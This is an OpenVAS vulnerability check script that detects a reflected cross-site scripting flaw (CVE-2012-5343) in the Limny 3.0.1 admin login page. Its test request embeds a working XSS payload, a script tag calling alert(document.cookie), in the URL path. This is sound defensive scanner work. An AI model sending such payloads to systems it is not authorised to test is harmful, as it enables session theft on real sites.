###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_limny_login_xss_vuln.nasl 4712 2016-12-08 10:26:10Z cfi $
#
# Limny 'login.php' Script Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:limny:limny";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802983");
  script_version("$Revision: 4712 $");
  script_cve_id("CVE-2012-5343");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2016-12-08 11:26:10 +0100 (Thu, 08 Dec 2016) $");
  script_tag(name:"creation_date", value:"2012-10-12 14:16:51 +0530 (Fri, 12 Oct 2012)");
  script_name("Limny 'login.php' Script Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_limny_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("limny/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47444");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72113");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2012010034");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/codes/limny_xss.txt");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5066.php");

  tag_impact = "Successful exploitation could allow attackers to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site.

  Impact Level: Application";

  tag_affected = "Limny version 3.0.1";

  tag_insight = "Input passed via the URL to 'admin/login.php' is not properly sanitised
  before being returned to the user.";

  tag_solution = "Upgrade to Limny version 3.0.2 or later
  For updates refer to http://www.limny.org/download";

  tag_summary = "This host is running Limny and is prone to cross site scripting
  vulnerability.";

  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

## Construct xss attack
url = dir + '/admin/login.php/"><script>alert(document.cookie)</script>';

## Confirm exploit worked properly or not
if( http_vuln_check( port:port, url:url, check_header:TRUE,
                     pattern:"><script>alert\(document.cookie\)<",
                     extra_check:">Limny<" ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );